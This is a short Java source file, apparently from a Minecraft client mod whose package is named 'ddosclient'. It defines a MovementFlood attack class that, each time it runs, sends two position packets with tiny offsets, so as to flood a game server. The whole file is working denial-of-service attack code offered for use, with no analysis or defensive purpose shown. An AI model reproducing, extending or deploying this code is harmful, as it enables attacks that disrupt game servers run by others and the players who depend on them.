package com.ddosclient.attack.attacks;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class MovementFlood extends BaseAttack {
    private double offset = 0;

    @Override
    public void execute(MinecraftClient mc) {
        if (mc.getNetworkHandler() == null || mc.player == null) return;
        double x = mc.player.getX() + (Math.sin(offset) * 0.001);
        double y = mc.player.getY();
        double z = mc.player.getZ() + (Math.cos(offset) * 0.001);
        offset += 0.01;
        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(x, y, z, true));
        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(x, y + 0.001, z, false));
    }
}
